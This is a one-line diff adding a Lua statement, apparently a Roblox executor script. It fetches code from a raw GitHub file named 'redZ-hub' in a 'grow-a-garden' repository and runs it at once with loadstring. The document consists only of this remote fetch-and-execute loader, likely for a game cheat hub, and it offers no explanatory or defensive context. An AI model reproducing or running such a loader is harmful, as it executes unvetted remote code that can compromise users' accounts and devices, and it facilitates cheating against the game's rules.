@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Usermamejsjdjf/grow-a-garden/refs/heads/main/redZ-hub", true))()
